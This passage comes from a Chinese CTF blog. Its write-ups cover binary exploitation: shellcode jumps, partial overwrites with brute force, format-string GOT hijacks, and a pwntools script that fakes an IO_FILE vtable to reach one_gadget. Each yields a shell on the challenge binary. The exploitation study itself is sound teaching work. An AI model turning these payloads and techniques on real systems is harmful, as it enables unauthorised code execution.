<p>其实这次比赛也学到很多，虽然比赛的时候一道题也没写出来，总的来说还是自己的经验太少。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/CSAW%20Quals%20CTF%202017-pilot/">CSAW Quals CTF 2017-pilot</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规check，发现这破程序啥保护也没开，而且还存在RWX段：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555089.jpeg" alt="img"></p>
<p>这不瞎搞嘛。之后IDA找漏洞，发现栈溢出：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">char buf; // [rsp+0h] [rbp-20h]</span><br><span class="line">if ( read(0, &amp;buf, 0x40uLL) &gt; 4 )：</span><br></pre></td></tr></table></div></figure>

<p>2.这里就可以思考下攻击思路，存在栈溢出，还有RWX段，考虑用shellcode。虽然这个RWX段是随机生成的栈，地址没办法确定。再看看程序，发现程序自己给我们泄露了buf的栈地址：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191555043.jpeg" alt="img"></p>
<p>也就是说紧跟再location后面的打印出来的就是buf的真实栈地址，这样我们就可以接受该栈地址，然后用栈溢出使得我们的main函数返回时可以跳转到对应的buf地址上，而buf地址上的内容就是我们的输入，也就是输入的shellcode，这样就可以执行我们的shellcode了。</p>
<p>3.但是写完shellcode会发现程序崩溃，这里进入IDA调试一下shellcode。可以发现程序运行过程中，Main函数return执行之后，跳转到shellcode的地方，然后运行shellcode。但是这一过程中，栈顶指向了main函数return的地址。所以在运行shellcode过程中，由于shellcode中有一个push rbx命令，导致rsp向上移动8个字节会覆盖掉shellcode的首地址。本来这没啥事，毕竟已经进入到shellcode当中去了，但是后面还有push rax和push rdi这两个改变rsp的命令，这就导致了rsp再次向低地址覆盖了16个字节，总共覆盖了24个字节。但是我们输入的shellcode有48个字节，顺序为shellcode+nop*10+addr_shellcode，也就是扣掉最后18个字节，还多出来6个字节覆盖掉了我们的执行代码shellcode的最后6个字节代码，导致我们的shellcode没办法完全执行，最终导致程序出错。</p>
<p>4.由于read函数允许我们输入0x40，也就是64个字节，也就是在覆盖掉返回地址之后，我们还能再输入64-48=16个字节。由于push rdi之后的片段为8个字节(包括了push rdi)，小于16个字节，能够容纳下我们被覆盖掉的shellcode的代码，所以这里我们可以考虑用拼接的方式来把shellcode完美执行。</p>
<p>5.现在考虑如何把两段shellcode汇编代码连在一起。有call,return和jmp，但是前面两条指令中，call会push进函数地址，而return也会修改栈和寄存器的状态，ret指令的本质是pop eip，即把当前栈顶的内容作为内存地址进行跳转。所以只能选择jmp跳转。</p>
<p>6.可以查阅Intel开发者手册或其他资料找到jmp对应的字节码，或者这个程序中带了一条Jmp可以加以利用。为EB，jmp x总共2个字节：EB x.</p>
<p>7.将两段隔开，从push rdi开始，将push rdi和之后的代码都挪到下一个地方。这时第一段shellcode应该是22+2(jmp x)=24个字节，距离下段shellcode的距离应该是48-24=24，也就对应0x18h，所以总的shellcode应该是shellcode1+EB 18h+shellcode2，这样可以顺利执行需要的shellcode。</p>
<p>▲jmp的跳转计算距离是从jmp指令下一条开始计算的。</p>
<p>▲shellcode的两段执行：</p>
<p>1.需要泄露地址，读取泄露地址：</p>
<p>A.print io.recvuntil(“Location:”)#读取到即将泄露地址的地方。</p>
<p>B.shellcode_address_at_stack = int(io.recv()[0:14], 16)#将泄露出来的地址转换为数字流</p>
<p>C.log.info(“Leak stack address = %x”, shellcode_address_at_stack)#将泄露地址尝试输出，观察是否泄露成功。</p>
<p>2.需要跳转jmp命令或者是return/call，但是return会pop eip，call会push eip，都会修改掉栈中的内容。如果shellcode的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是jmp就不会需要，是直接无条件跳转，所以大多时候选择jmp比较好。</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/DefCamp%20CTF%20Finals%202016-SMS/">DefCamp CTF Finals 2016-SMS</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec操作，开了PIE和NX，首先shellcode不能用。其次PIE表示地址随机化，也就是没办法覆盖返回地址来直接跳转到我们想要的函数处。IDA打开找漏洞，可以看到在doms函数中的v1的栈地址被传递给set_user和set_sms</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528555.jpeg" alt="img"></p>
<p>之后set_user中会读取输入保存在S这个栈地址上，然后从s中读取前四十个字节到a1[140]-a1[180]，这个a1就是doms函数中的v1。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191528927.jpeg" alt="img"></p>
<p>再往后看，在set_sms函数中，同样读取1024个字节到S这个栈变量中，并且最后将S的特定长度strncpy给a1，这个特定长度就是a1[180]。所以这里我们可以通过set_user来控制a1[180]，进而控制set_sms函数中strncpy给a1拷贝的长度，也就是doms函数中v1的长度，使其大于v1距离栈底的距离0xc0，从而在doms函数栈中执行栈溢出，而doms函数中的v1也就是a1，是在set_sms中由我们输入到S上的内容拷贝过去的，长度为0x400，完全可控。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527621.jpeg" alt="img"></p>
<p>另外程序存在后门frontdoor()，只要进入这个函数，再输入binsh字符串就能getshell。</p>
<p>2.所以现存在doms函数栈溢出，后门函数这两个漏洞，但是由于PIE，在程序运行过程中没办法确定frontdoor()的地址，无法直接覆盖doms函数返回地址到达后门函数</p>
<p>3.这里就需要用到内存页的一个知识点，由于一个内存页的大小为0x1000，而frontdoor()函数和dosms函数和main函数等等函数，都在同一个内存页上，所以在64位程序下他们的函数地址都是0x############x<em><strong>这种类型，前面12位#每次加载都不一样，而后面的三位</strong></em>不会发生改变，因为都在0x0000563cc913(x)000 - 0x0000563cc913(x+1)000这个内存页上。用IDA打开按ctrl+s可以看到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191527058.png" alt="img"></p>
<p>这些段都在0x0000563cc913(x)000 - 0x0000563cc913(x+1)000这个内存页上。而开启了PIE程序的，0000563cc913(x)这个数值每次都会变化，但是最后三位是不会改变的，就是固定相对于这个内存页起始位置的偏移。</p>
<p>4.所以覆盖返回地址时，可以想到，dosms函数的返回地址是call dosms下一条指令，也就是在main函数上，而frontdoor函数的地址与main函数的地址都在0x0000563cc913(x)这个内存页上。所以当程序被加载，0x0000563cc913(x)这个数值发生改变时，frontdoor函数和main函数地址中对应的数值也会相应改变，而且都是一样的。这种情况下，就可以通过修改dosms返回地址的后四位，也就是之前的(x)yyy来跳转到frontdoor。</p>
<p>5.如果直接爆破，按照数学期望需要尝试0xffff+1=65535+1这么多次，太巨大。这里又考虑到yyy时不会改变的，所以用IDA可以看到frontdoor函数的后三位地址为900，我们在写payload的时候直接写入即可，就是PIE也不会发生改变。现在唯一不确定的就是(x)yyy中的x。直接爆破就好，平均尝试的数学期望为f+1=16次，也不算太高。</p>
<p>6.所以尝试写payload:</p>
<p>(1)修改set_user中的a1[180]的值：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def setlength():</span><br><span class="line">    io.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">    payload_setlength = &#x27;a&#x27;*40 #padding</span><br><span class="line">    payload_setlength += &#x27;\xca&#x27; </span><br><span class="line">    io.sendline(payload_setlength)</span><br></pre></td></tr></table></div></figure>

<p>(2)执行栈溢出，覆盖返回地址的低两个字节为”\x(x)9”和”\x01”(大端序，注意顺序)</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def StackOverflow():</span><br><span class="line">    io.recvuntil(&#x27;&gt; &#x27;)</span><br><span class="line">    payload_StackOverflow = &#x27;a&#x27;*200 #padding</span><br><span class="line">    payload_StackOverflow += &#x27;\x01\xa9&#x27; </span><br><span class="line">    #frontdoor的地址后三位是0x900, +1跳过push rbp，影响</span><br><span class="line">    io.sendline(payload_StackOverflow)</span><br></pre></td></tr></table></div></figure>

<p>这里跳过push rbp的原因是因为strncpy的关系，如果发送的是\x00,\xa9，那么先复制\x00，则会由于strncpy的机制提前结束复制，造成a9没办法复制进去，从而程序出错。(发送的由于是fget函数，所以会全盘接受，\x00也会接受，不是读取函数的原因。)而跳过push rbp并不影响frontdoor里面的函数执行，所以不会影响getshell。</p>
<p>(3)由于每次地址随机，所以地址随机成a900的概率为1/16，那么就考虑用自动化来爆破实施：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    i += 1</span><br><span class="line">    print i</span><br><span class="line">    io.remote(&quot;127.0.0.1&quot;,0000)</span><br><span class="line">    setlength()</span><br><span class="line">    StackOverflow()</span><br><span class="line">    try:</span><br><span class="line">        io.recv(timeout = 1) </span><br><span class="line">        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError</span><br><span class="line">    except EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        sleep(0.1)</span><br><span class="line">        io.sendline(&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">        sleep(0.1)</span><br><span class="line">        io.interactive() #没有EOFError的话就是爆破成功，可以开shell</span><br><span class="line">        break</span><br></pre></td></tr></table></div></figure>

<p>▲如果直接process本地则没办法成功运行，需要用socat转发，用127.0.0.1本地连接才可以。</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/Format_x86%E5%92%8Cformat_x64/">Format_x86和format_x64</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>★32位程序：</p>
<p>1.常规checksec，只开了NX。打开IDA查漏洞，main函数中格式化字符串漏洞：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">memset(&amp;buf, 0, 0x12Cu);</span><br><span class="line">read(0, &amp;buf, 0x12Bu);</span><br><span class="line">printf(&amp;buf);</span><br></pre></td></tr></table></div></figure>

<p>2.这里会有一个重复读取的循环，开shell需要system函数和binsh字符串，这里只有system函数，got和plt都对应有，没有binsh字符串，没有libc。</p>
<p>3.由于printf漏洞，我们可以利用这个漏洞向指定的内存地址写入指定的内容，这里考虑将printf的got中的值更改system函数plt表项的值。原本如果调用printf函数，则相当于执行printf函数的got表中保存的printf函数的真实地址处的代码，更改之后相当于执行system函数plt表地址处的代码，也就相当于调用system函数。原理如下：</p>
<p>原本执行Printf函数：相当于执行printf的执行代码</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">printf_got_addr:   7Fxxxxxx</span><br><span class="line">7Fxxxxxx:          printf的执行代码</span><br></pre></td></tr></table></div></figure>

<p>更改之后：相当于执行jmp system_got代码，那就相当于执行system函数了</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">printf_got_addr:          08048320(system_plt)</span><br><span class="line">08048320(system_plt):     jmp system_got</span><br></pre></td></tr></table></div></figure>

<p>4.那么预想程序总流程如下：第一次读取，输入payload，然后printf执行，将printf的got表更改为system函数plt表。通过while循环，第二次读取，输入binsh字符存入buf中，此时printf(&amp;buf)，相当于system(&amp;buf)，那就相当于system(binsh)，即可直接getshell。</p>
<p>5.编写payload，首先需要计算一下偏移地址，将断点下在call printf上，通过调试能够查看到printf写入栈中的地址距离esp的偏移量为6，所以使用控制字符%n来将printf劫持到system，这里偏移就会成n-1为5。偏移代表的是取参数的时候的偏移量，下面的payload对应的5，6，7，8就对应向地址print_got，print_got+1，print_got+2，print_got+3写入内容。由于是修改地址，所以用%hhn来逐个修改，防止向服务器发送过大数据从而出错。</p>
<p>(1)找到got表和plt表项的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">printf_got = 0x08049778</span><br><span class="line">system_plt = 0x08048320</span><br></pre></td></tr></table></div></figure>

<p>(2)32位程序，4个字节一个地址，所以需要四个地址：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = p32(printf_got)</span><br><span class="line">payload += p32(printf_got+1)</span><br><span class="line">payload += p32(printf_got+2)</span><br><span class="line">payload += p32(printf_got+3)</span><br></pre></td></tr></table></div></figure>

<p>(3)由于是大端序，低地址保存的是高地址的内容，print_got需要保存的应该是system_plt的最后一个字节，也就是0x20。</p>
<p>①由于前面已经输入了p32(printf_got)+p32(printf_got1)+p32(printf_got2)+p32(printf_got3)，这些在没有遇到%之前一定会被打印出来，共计16个字节，而我们需要让它总共打印出0x20个字节，所以我们再打印(0x20-16)个字节。</p>
<p>②同样，由于前面已经打印了0x20个字节，我们总共需要打印0x83个字节，所以应该再让程序打印%(0x83-0x20)个字节，之后道理相同。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x20-16)</span><br><span class="line">payload += &quot;c%5$hhn&quot;</span><br><span class="line">#写入0x20到地址print_got</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x83-0x20)</span><br><span class="line">payload += &quot;c%6$hhn&quot;</span><br><span class="line">#写入0x83到地址print_got+1</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x104-0x83)</span><br><span class="line">payload += &quot;c%7$hhn&quot;</span><br><span class="line">#写入0x04到地址print_got+2，0x104被截断为04</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x108-0x104)</span><br><span class="line">payload += &quot;c%8$hhn&quot;</span><br><span class="line">#写入0x08到地址print_got+3，0x108被截断为08</span><br></pre></td></tr></table></div></figure>

<p>▲为了便于理解，下面代码也行：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = p32(printf_got+1) </span><br><span class="line">#使用hhn写入，分别对应待写入的第3，4，2，1字节</span><br><span class="line">payload += p32(printf_got)</span><br><span class="line">payload += p32(printf_got+2)</span><br><span class="line">payload += p32(printf_got+3)</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x83-16) #被写入的数据，注意四个地址长度是16，需要减掉</span><br><span class="line">payload += &quot;c%5$hhn&quot;</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x120-0x83)</span><br><span class="line">payload += &quot;c%6$hhn&quot;</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x204-0x120) #由于是hhn所以会被截断，只留后两位</span><br><span class="line">payload += &quot;c%7$hhn&quot;</span><br><span class="line"></span><br><span class="line">payload += &quot;%&quot;</span><br><span class="line">payload += str(0x208-0x204)</span><br><span class="line">payload += &quot;c%8$hhn&quot;</span><br></pre></td></tr></table></div></figure>

<p>6.其实可以直接使用类Fmtstr，效果一样，将Payload替换成下列代码即可</p>
<p>payload = fmtstr_payload(5, {printf_got:system_plt})</p>
<p>7.之后再io.sendline(‘/bin/sh\x00’)，即可getshell</p>
<p>★64位程序</p>
<p>1.由于64位，传参的顺序为rdi, rsi, rdx, rcx, r8, r9，接下来才是栈，所以偏移量应该是6指向栈顶。之后考虑使用fmtstr来直接构造获取：</p>
<p>payload = fmtstr_payload(6, {printf_got:system_plt})</p>
<p>但是这个方法会出错，因为在这种情况下，我们的地址如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">printf_got = 0x00601020</span><br><span class="line">system_plt = 0x00400460</span><br></pre></td></tr></table></div></figure>

<p>需要写入地址printf_got的首两位是00，且以p64形式发送，所以先发送的是0x20，0x10，0x60，0x00，0x00…….而Read函数读到0x00就会截断，默认这是字符串结束了，所以之后的都无效了。</p>
<p>2.那么考虑手动方式，将p64(printf_got)放在payload的末尾，这样就只有最后才会读到0x00，其它的有效数据都能读入。</p>
<p>3.使用手动方式就需要再次计算偏移量，我们的payload构成应该是</p>
<p>payload = ”%”+str(system_plt)+”c%8$lln” + p64(printf_got)</p>
<p>这里偏移量为8是因为经过调试发现我们的输入从栈顶开始计算，也就是从栈顶开始，一共输入了</p>
<p>1(%) + 7(0x400460转换成十进制为4195424，也就是7个字节) + 7(“c%8$lln”) + 8(p64_printf_got)=23个字节。</p>
<p>经过计算我们发现，p64前面的字节数为15个字节，不足8的倍数，这样会导致printf_got的最后一个字节20被截断至偏移量为7的位置，从而使得偏移量为8的位置只有6010，导致出错。所以我们需要填充一个字节进去，让它不会被截断。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191543645.png" alt="img"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = ”a%” + str(system_plt-1)+”c%8$lln” + p64(printf_got)</span><br></pre></td></tr></table></div></figure>

<p>加入一个字节a就可以使得在参数偏移量为6和7的位置中不会截断0x601020。同时加入字节a就要使system_plt-1来满足最终打印的字符个数为0x00400460，从而才能成功将0x00400460(system_plt)写入到0x00601020(printf_got)</p>
<p>5.完成payload之后，再次循环进入，输入io.sendline(‘/bin/sh\x00’)后interactive()即可getshell</p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/HCTF2018_the_end/">HCTF2018_the_end</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，除了canary之外保护全开。IDA打开找漏洞，没什么漏洞，就是程序会泄露出sleep的地址，然后让我们在任意地方写入5个字节，并且给了libc文件，那么就可以算出libc基地址，版本为2.23。</p>
<p>printf(“here is a gift %p, good luck ;)\n”, &amp;sleep);</p>
<p>2.程序最后调用exit(1337)，两种方法：</p>
<p>(1)exit会无条件通过_IO_2_1_stdout_结构体调用vtable虚表中的_setbuf函数。</p>
<p>(2)exit会通过_IO_2_1_stdout_结构体调用vtable虚表中的_overflow函数，但需要满足以下条件：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">_IO_FILE_plus._mode &lt;= 0</span><br><span class="line">_IO_FILE_plus._IO_write_ptr &gt; _IO_FILE_plus._IO_write_base</span><br></pre></td></tr></table></div></figure>

<p>所以我们伪造的_IO_FILE_plus结构体就需要满足上述条件</p>
<p>(3)exit会调用_rtld_global结构体中的_dl_rtld_lock_recursive函数，不用满足条件。</p>
<p>3.三种方法攻击思路:</p>
<p>(1)由于会调用_setbuf函数，vtable位于libc数据段上不可写部分，无法直接修改vtable对应的_IO_file_jumps中的函数指针。那么可以伪造_IO_2_1_stdout_中的vtable指针，利用2字节修改vtable指针的倒数两个字节，使其指向一个可读可写内存，形成一个fake_IO_file_jumps，然后在该内存对应_setbuf函数偏移处伪造one_gadget地址。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">libc=ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</span><br><span class="line">p = process(&#x27;./the_end&#x27;)</span><br><span class="line"></span><br><span class="line">vtable_offset = 0xd8</span><br><span class="line">_setbuf_offset = 0x58</span><br><span class="line">fake_vtable_offset = 0x3c5588</span><br><span class="line">#这个需要自己调试找，并保证偏移_setbuf_offset处修改之后程序不会直接崩溃</span><br><span class="line"></span><br><span class="line">sleep_addr = p.recvuntil(&#x27;, good luck&#x27;,drop=True).split(&#x27; &#x27;)[-1] </span><br><span class="line">libc_base = long(sleep_addr,16) - libc.symbols[&#x27;sleep&#x27;]</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + 0xf02b0</span><br><span class="line">_IO_2_1_stdout_vtable_addr = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;] + vtable_offset</span><br><span class="line"></span><br><span class="line">fake_vtable = libc_base + fake_vtable_offset</span><br><span class="line">fake_vtable_setbuf_addr = libc_base + fake_vtable_offset + _setbuf_offset</span><br><span class="line"></span><br><span class="line">print &#x27;libc_base: &#x27;,hex(libc_base)</span><br><span class="line">print &#x27;one_gadget:&#x27;,hex(one_gadget)</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    p.send(p64(_IO_2_1_stdout_vtable_addr+i))</span><br><span class="line">    p.send(p64(fake_vtable)[i])</span><br><span class="line"></span><br><span class="line">for i in range(3):</span><br><span class="line">    p.send(p64(fake_vtable_setbuf_addr+i))</span><br><span class="line">    p.send(p64(one_gadget)[i])</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;exec /bin/sh 1&gt;&amp;0&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p>(2)_IO_FILE_plus结构体位于libc数据段上可读可写内存处，可以直接修改，但是修改字节数只有5个，按照第一种方法：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">_IO_FILE_plus._mode &lt;= 0  //该条件自动就会满足</span><br><span class="line">_IO_FILE_plus._IO_write_ptr &gt; _IO_FILE_plus._IO_write_base//该条件需要设置1个字节</span><br></pre></td></tr></table></div></figure>

<p>再利用1个字节修改vtable的倒数第二个字节，伪造vtable指针，然后利用3个字节在该内存对应_setbuf函数偏移处伪造one_gadget地址。</p>
<p>(3)_rtld_global结构体位于libc数据段上可读可写内存处，可以直接修改。那么直接修改_dl_rtld_lock_recursive函数指针指向one_gadget就行了。</p>
<p>方法(2)和方法(3)参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Mira_Hu/article/details/103736917" >https://blog.csdn.net/Mira_Hu/article/details/103736917</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>参考资料：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://wiki.x10sec.org/pwn/linux/io_file/fake-vtable-exploit-zh/" >https://wiki.x10sec.org/pwn/linux/io_file/fake-vtable-exploit-zh/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
